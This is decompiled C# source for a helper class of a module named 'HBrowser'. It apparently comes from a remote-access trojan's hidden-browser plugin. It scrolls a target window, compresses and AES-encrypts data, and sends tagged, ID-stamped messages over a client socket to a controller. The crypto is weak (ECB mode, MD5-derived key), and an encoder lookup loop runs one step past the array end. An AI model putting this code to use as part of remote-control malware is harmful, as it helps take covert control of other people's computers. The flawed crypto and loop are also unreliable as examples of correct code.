using System;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace HBrowser
{
	// Token: 0x0200000A RID: 10
	internal static class Helper
	{
		// Token: 0x06000031 RID: 49
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000032 RID: 50 RVA: 0x00003EB8 File Offset: 0x000020B8
		public static void ScrollDown()
		{
			IntPtr windowrActive = Helper.WindowrActive;
			bool flag = windowrActive != IntPtr.Zero;
			if (flag)
			{
				Helper.SendMessage(windowrActive, 277, new IntPtr(1), IntPtr.Zero);
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00003EF4 File Offset: 0x000020F4
		public static void ScrollUp()
		{
			IntPtr windowrActive = Helper.WindowrActive;
			bool flag = windowrActive != IntPtr.Zero;
			if (flag)
			{
				Helper.SendMessage(windowrActive, 277, new IntPtr(0), IntPtr.Zero);
			}
		}

		// Token: 0x17000002 RID: 2
		// (get) Token: 0x06000034 RID: 52 RVA: 0x00003F2E File Offset: 0x0000212E
		// (set) Token: 0x06000035 RID: 53 RVA: 0x00003F35 File Offset: 0x00002135
		public static IntPtr WindowrActive { get; set; }

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x06000036 RID: 54 RVA: 0x00003F3D File Offset: 0x0000213D
		// (set) Token: 0x06000037 RID: 55 RVA: 0x00003F44 File Offset: 0x00002144
		public static int Quality { get; set; }

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x06000038 RID: 56 RVA: 0x00003F4C File Offset: 0x0000214C
		// (set) Token: 0x06000039 RID: 57 RVA: 0x00003F53 File Offset: 0x00002153
		public static bool Resize { get; set; }

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600003A RID: 58 RVA: 0x00003F5B File Offset: 0x0000215B
		// (set) Token: 0x0600003B RID: 59 RVA: 0x00003F62 File Offset: 0x00002162
		public static bool Speed { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x0600003C RID: 60 RVA: 0x00003F6A File Offset: 0x0000216A
		// (set) Token: 0x0600003D RID: 61 RVA: 0x00003F71 File Offset: 0x00002171
		public static int X { get; set; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x0600003E RID: 62 RVA: 0x00003F79 File Offset: 0x00002179
		// (set) Token: 0x0600003F RID: 63 RVA: 0x00003F80 File Offset: 0x00002180
		public static int Y { get; set; }

		// Token: 0x06000040 RID: 64 RVA: 0x00003F88 File Offset: 0x00002188
		public static void MsgLogs(string Message)
		{
			ClientSocket.Send(string.Concat(new string[]
			{
				"HBrowserMSG",
				Settings.SPL,
				Settings.IDD,
				Settings.SPL,
				Message
			}));
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00003FC0 File Offset: 0x000021C0
		public static ImageCodecInfo GetEncoderInfo(string M)
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int num = 0;
			int num2 = imageEncoders.Length;
			for (int i = num; i <= num2; i++)
			{
				bool flag = Operators.CompareString(imageEncoders[i].MimeType, M, false) == 0;
				if (flag)
				{
					return imageEncoders[i];
				}
			}
			return null;
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00004018 File Offset: 0x00002218
		public static byte[] Decompress(byte[] input)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream(input))
			{
				byte[] array = new byte[4];
				memoryStream.Read(array, 0, 4);
				int num = BitConverter.ToInt32(array, 0);
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
				{
					byte[] array2 = new byte[num];
					gzipStream.Read(array2, 0, num);
					result = array2;
				}
			}
			return result;
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000040A0 File Offset: 0x000022A0
		public static byte[] Compress(byte[] input)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				byte[] bytes = BitConverter.GetBytes(input.Length);
				memoryStream.Write(bytes, 0, 4);
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
				{
					gzipStream.Write(input, 0, input.Length);
					gzipStream.Flush();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00004124 File Offset: 0x00002324
		public static byte[] SB(string s)
		{
			return Encoding.UTF8.GetBytes(s);
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00004144 File Offset: 0x00002344
		public static string BS(byte[] b)
		{
			return Encoding.UTF8.GetString(b);
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00004164 File Offset: 0x00002364
		public static byte[] AES_Encryptor(byte[] input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Helper.SB(Settings.KEY));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
				return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			return null;
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000041E0 File Offset: 0x000023E0
		public static byte[] AES_Decryptor(byte[] input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			try
			{
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Helper.SB(Settings.KEY));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			return null;
		}

		// Token: 0x04000013 RID: 19
		public static MemoryStream Appsstream = new MemoryStream();
	}
}
